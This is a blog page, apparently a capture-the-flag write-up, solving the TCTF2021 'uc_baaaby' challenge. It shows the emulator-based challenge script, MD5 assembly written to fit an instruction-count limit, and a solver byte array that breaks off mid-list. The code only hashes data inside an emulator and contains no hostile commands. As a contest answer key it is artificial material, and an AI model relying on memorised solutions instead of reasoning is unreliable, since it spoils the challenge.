

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Pandaos">
  <meta name="keywords" content="">
  
  <title>TCTF2021: uc_master uc_baaby FEA - Pandaos&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"panda0s.top","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pandaos's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Panadaos</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss-fill"></i>
                Rss
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/bg.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="TCTF2021: uc_master uc_baaby FEA">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-07-06 13:01" pubdate>
        July 6, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      6k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      112
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">TCTF2021: uc_master uc_baaby FEA</h1>
            
            <div class="markdown-body">
              <h1 id="TCTF2021-uc-masteeer-uc-baaaby-FEA"><a href="#TCTF2021-uc-masteeer-uc-baaaby-FEA" class="headerlink" title="TCTF2021: uc_masteeer  uc_baaaby FEA"></a>TCTF2021: uc_masteeer  uc_baaaby FEA</h1><h2 id="uc-baaaby"><a href="#uc-baaaby" class="headerlink" title="uc_baaaby"></a>uc_baaaby</h2><p>题目给出的脚本如下 <a href="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/uc_baaaby.zip" title="uc_baaaby.zip">uc_baaaby.zip</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> hashlib<br><br>FLAG = <span class="hljs-string">&#x27;flag&#123;xxxx&#125;&#x27;</span><br>CODE = <span class="hljs-number">0xdeadbeef000</span><br>DATA = <span class="hljs-number">0xbabecafe000</span><br>finished = <span class="hljs-literal">False</span><br>insn_count = <span class="hljs-number">0</span><br>block_count = <span class="hljs-number">0</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_block</span>(<span class="hljs-params">uc, address, size, user_data</span>):</span><br>    <span class="hljs-keyword">global</span> block_count<br>    block_count += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> block_count &gt; <span class="hljs-number">1</span>:<br>        print(<span class="hljs-string">&#x27;No cheating!&#x27;</span>)<br>        uc.emu_stop()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_code</span>(<span class="hljs-params">uc, address, size, user_data</span>):</span><br>    <span class="hljs-keyword">global</span> insn_count, finished<br>    insn_count += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> address == CODE + <span class="hljs-number">0x2000</span>:<br>        finished = <span class="hljs-literal">True</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">play</span>():</span><br>    <span class="hljs-keyword">global</span> finished<br>    uc = Uc(UC_ARCH_X86, UC_MODE_64)<br><br>    code = os.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x2000</span>)<br><br>    uc.mem_map(CODE, <span class="hljs-number">0x3000</span>, UC_PROT_READ | UC_PROT_EXEC)<br>    uc.mem_write(CODE, code)<br>    uc.mem_write(CODE + <span class="hljs-number">0x2000</span>, <span class="hljs-string">b&#x27;\xf4&#x27;</span>)<br><br>    check_data = os.urandom(<span class="hljs-number">50</span>)<br>    uc.mem_map(DATA, <span class="hljs-number">0x1000</span>, UC_PROT_READ | UC_PROT_WRITE)<br>    uc.mem_write(DATA, check_data)<br><br>    uc.hook_add(UC_HOOK_CODE, hook_code)<br>    uc.hook_add(UC_HOOK_BLOCK, hook_block)<br><br>    <span class="hljs-keyword">try</span>:<br>        uc.emu_start(CODE, CODE + <span class="hljs-number">0x3000</span>)<br>    <span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>        finished = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    user_data = uc.mem_read(DATA + <span class="hljs-number">0x800</span>, <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> user_data == hashlib.md5(check_data).digest():<br>        print(<span class="hljs-string">&#x27;Nice.&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&#x27;0ops.&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    print(<span class="hljs-string">&#x27;Welcome to uc_baaaby&#x27;</span>)<br>    win = play()<br>    <span class="hljs-keyword">if</span> finished <span class="hljs-keyword">and</span> win:<br>        print(<span class="hljs-string">&quot;Congratulation! You&#x27;ve reached the end!&quot;</span>)<br>        print(<span class="hljs-string">f&#x27;You took <span class="hljs-subst">&#123;insn_count&#125;</span> seconds.\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> insn_count &lt; <span class="hljs-number">0x233</span>:<br>            print(<span class="hljs-string">&#x27;How is this possible??? Even Bolt can\&#x27;t run this fast.&#x27;</span>)<br>            print(<span class="hljs-string">&#x27;Prize for you:&#x27;</span>, FLAG)<br>        <span class="hljs-keyword">elif</span> insn_count &lt; <span class="hljs-number">0x300</span>:<br>            print(<span class="hljs-string">&#x27;Come on. You can be faster.&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&#x27;Gege jia you.&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>需要构造 shellcode 计算 check_data 的 MD5 值。 check_data 会被写入到 DATA 地址，shellcode 应该将计算的 MD5 结果 16 字节写入到 DATA + 0x800 地址。</p>
<p>根据题目代码逻辑得出 shellcode 的限制条件:</p>
<ol>
<li>shellcode 指令执行数小于 0x233</li>
<li>shellcode 只能有一个基本块，不能存在任何跳转（ret也不行）</li>
<li>shellcode 必须要执行到 0x2000 停止</li>
</ol>
<p>12 条件好满足，check_data 的长度固定是 50 字节，只需要计算一个 md5 分组，提前计算 padding 数据，尾加到 check_data 尾部，然后调用 64 个 MD5 计算子过程，最后将结果写入 DATA + 0x800 内存。</p>
<p>shellcode 如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs asm">.globl md5_compress<br>.globl block1<br>.globl dist<br>md5_compress:<br>	#define ROUND0(a, b, c, d, k, s, t)  \<br>		movl  %c, %esi;         \<br>		addl  (k*4)(%rbp), %a;  \<br>		xorl  %d, %esi;         \<br>		andl  %b, %esi;         \<br>		xorl  %d, %esi;         \<br>		leal  t(%esi,%a), %a;   \<br>		roll  $s, %a;           \<br>		addl  %b, %a;<br>	<br>	#define ROUND1(a, b, c, d, k, s, t)  \<br>		movl  %d, %esi;         \<br>		movl  %d, %edi;         \<br>		addl  (k*4)(%rbp), %a;  \<br>		notl  %esi;             \<br>		andl  %b, %edi;         \<br>		andl  %c, %esi;         \<br>		orl   %edi, %esi;       \<br>		leal  t(%esi,%a), %a;   \<br>		roll  $s, %a;           \<br>		addl  %b, %a;<br>	<br>	#define ROUND2(a, b, c, d, k, s, t)  \<br>		movl  %c, %esi;         \<br>		addl  (k*4)(%rbp), %a;  \<br>		xorl  %d, %esi;         \<br>		xorl  %b, %esi;         \<br>		leal  t(%esi,%a), %a;   \<br>		roll  $s, %a;           \<br>		addl  %b, %a;<br>	<br>	#define ROUND3(a, b, c, d, k, s, t)  \<br>		movl  %d, %esi;         \<br>		not   %esi;             \<br>		addl  (k*4)(%rbp), %a;  \<br>		orl   %b, %esi;         \<br>		xorl  %c, %esi;         \<br>		leal  t(%esi,%a), %a;   \<br>		roll  $s, %a;           \<br>		addl  %b, %a;<br><br><br>	movq  $block1, %rbp<br>    nop<br>    nop<br>    nop<br>    nop<br>    movl $0x67452301, %eax<br>    movl $0xefcdab89, %ebx<br>    movl $0x98badcfe, %ecx<br>    movl $0x10325476, %edx<br>    &#x2F;* pading data *&#x2F;<br>    movl $0x80, 0x32(%rbp)<br>    movl $0x1900000, 0x36(%rbp)<br>    movq $0x0, 0x3a(%rbp)<br>	<br><br>	ROUND0(eax, ebx, ecx, edx,  0,  7, -0x28955B88)<br>	ROUND0(edx, eax, ebx, ecx,  1, 12, -0x173848AA)<br>	ROUND0(ecx, edx, eax, ebx,  2, 17,  0x242070DB)<br>	ROUND0(ebx, ecx, edx, eax,  3, 22, -0x3E423112)<br>	ROUND0(eax, ebx, ecx, edx,  4,  7, -0x0A83F051)<br>	ROUND0(edx, eax, ebx, ecx,  5, 12,  0x4787C62A)<br>	ROUND0(ecx, edx, eax, ebx,  6, 17, -0x57CFB9ED)<br>	ROUND0(ebx, ecx, edx, eax,  7, 22, -0x02B96AFF)<br>	ROUND0(eax, ebx, ecx, edx,  8,  7,  0x698098D8)<br>	ROUND0(edx, eax, ebx, ecx,  9, 12, -0x74BB0851)<br>	ROUND0(ecx, edx, eax, ebx, 10, 17, -0x0000A44F)<br>	ROUND0(ebx, ecx, edx, eax, 11, 22, -0x76A32842)<br>	ROUND0(eax, ebx, ecx, edx, 12,  7,  0x6B901122)<br>	ROUND0(edx, eax, ebx, ecx, 13, 12, -0x02678E6D)<br>	ROUND0(ecx, edx, eax, ebx, 14, 17, -0x5986BC72)<br>	ROUND0(ebx, ecx, edx, eax, 15, 22,  0x49B40821)<br>	ROUND1(eax, ebx, ecx, edx,  1,  5, -0x09E1DA9E)<br>	ROUND1(edx, eax, ebx, ecx,  6,  9, -0x3FBF4CC0)<br>	ROUND1(ecx, edx, eax, ebx, 11, 14,  0x265E5A51)<br>	ROUND1(ebx, ecx, edx, eax,  0, 20, -0x16493856)<br>	ROUND1(eax, ebx, ecx, edx,  5,  5, -0x29D0EFA3)<br>	ROUND1(edx, eax, ebx, ecx, 10,  9,  0x02441453)<br>	ROUND1(ecx, edx, eax, ebx, 15, 14, -0x275E197F)<br>	ROUND1(ebx, ecx, edx, eax,  4, 20, -0x182C0438)<br>	ROUND1(eax, ebx, ecx, edx,  9,  5,  0x21E1CDE6)<br>	ROUND1(edx, eax, ebx, ecx, 14,  9, -0x3CC8F82A)<br>	ROUND1(ecx, edx, eax, ebx,  3, 14, -0x0B2AF279)<br>	ROUND1(ebx, ecx, edx, eax,  8, 20,  0x455A14ED)<br>	ROUND1(eax, ebx, ecx, edx, 13,  5, -0x561C16FB)<br>	ROUND1(edx, eax, ebx, ecx,  2,  9, -0x03105C08)<br>	ROUND1(ecx, edx, eax, ebx,  7, 14,  0x676F02D9)<br>	ROUND1(ebx, ecx, edx, eax, 12, 20, -0x72D5B376)<br>	ROUND2(eax, ebx, ecx, edx,  5,  4, -0x0005C6BE)<br>	ROUND2(edx, eax, ebx, ecx,  8, 11, -0x788E097F)<br>	ROUND2(ecx, edx, eax, ebx, 11, 16,  0x6D9D6122)<br>	ROUND2(ebx, ecx, edx, eax, 14, 23, -0x021AC7F4)<br>	ROUND2(eax, ebx, ecx, edx,  1,  4, -0x5B4115BC)<br>	ROUND2(edx, eax, ebx, ecx,  4, 11,  0x4BDECFA9)<br>	ROUND2(ecx, edx, eax, ebx,  7, 16, -0x0944B4A0)<br>	ROUND2(ebx, ecx, edx, eax, 10, 23, -0x41404390)<br>	ROUND2(eax, ebx, ecx, edx, 13,  4,  0x289B7EC6)<br>	ROUND2(edx, eax, ebx, ecx,  0, 11, -0x155ED806)<br>	ROUND2(ecx, edx, eax, ebx,  3, 16, -0x2B10CF7B)<br>	ROUND2(ebx, ecx, edx, eax,  6, 23,  0x04881D05)<br>	ROUND2(eax, ebx, ecx, edx,  9,  4, -0x262B2FC7)<br>	ROUND2(edx, eax, ebx, ecx, 12, 11, -0x1924661B)<br>	ROUND2(ecx, edx, eax, ebx, 15, 16,  0x1FA27CF8)<br>	ROUND2(ebx, ecx, edx, eax,  2, 23, -0x3B53A99B)<br>	ROUND3(eax, ebx, ecx, edx,  0,  6, -0x0BD6DDBC)<br>	ROUND3(edx, eax, ebx, ecx,  7, 10,  0x432AFF97)<br>	ROUND3(ecx, edx, eax, ebx, 14, 15, -0x546BDC59)<br>	ROUND3(ebx, ecx, edx, eax,  5, 21, -0x036C5FC7)<br>	ROUND3(eax, ebx, ecx, edx, 12,  6,  0x655B59C3)<br>	ROUND3(edx, eax, ebx, ecx,  3, 10, -0x70F3336E)<br>	ROUND3(ecx, edx, eax, ebx, 10, 15, -0x00100B83)<br>	ROUND3(ebx, ecx, edx, eax,  1, 21, -0x7A7BA22F)<br>	ROUND3(eax, ebx, ecx, edx,  8,  6,  0x6FA87E4F)<br>	ROUND3(edx, eax, ebx, ecx, 15, 10, -0x01D31920)<br>	ROUND3(ecx, edx, eax, ebx,  6, 15, -0x5CFEBCEC)<br>	ROUND3(ebx, ecx, edx, eax, 13, 21,  0x4E0811A1)<br>	ROUND3(eax, ebx, ecx, edx,  4,  6, -0x08AC817E)<br>	ROUND3(edx, eax, ebx, ecx, 11, 10, -0x42C50DCB)<br>	ROUND3(ecx, edx, eax, ebx,  2, 15,  0x2AD7D2BB)<br>	ROUND3(ebx, ecx, edx, eax,  9, 21, -0x14792C6F)<br><br>	&#x2F;* Save updated state *&#x2F;<br>    addl $0x67452301, %eax<br>    addl $0xefcdab89, %ebx<br>    addl $0x98badcfe, %ecx<br>    addl $0x10325476, %edx<br>    movq  $dist, %r8<br>    nop<br>    nop<br>    nop<br>    nop<br>    movl %eax, 0(%r8)<br>    movl %ebx, 4(%r8)<br>    movl %ecx, 8(%r8)<br>    movl %edx, 12(%r8)<br></code></pre></td></tr></table></figure>
<p>编译后， shellcode 中 block1  patch 为 DATA 地址， dist patch 为 DATA + 0x800 地址。</p>
<p>上面构造的 shellcode 的指令执行数量满足要求，但是不满足条件3，条件3要求指令执行结束的地址必须 0x2000，然而该 shellcode 的字节长度远远够不到 0x2000。</p>
<p>添加指令前缀 0x66 可以改变单条指令的大小，却不影响指令数量，而且好像可以无限添加。在第一条指令前添加 0x66 对齐到0x2000字节</p>
<p>最终 exp 如下</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">from pwn import *<br>code = [<span class="hljs-number">0x48</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x03</span>, <span 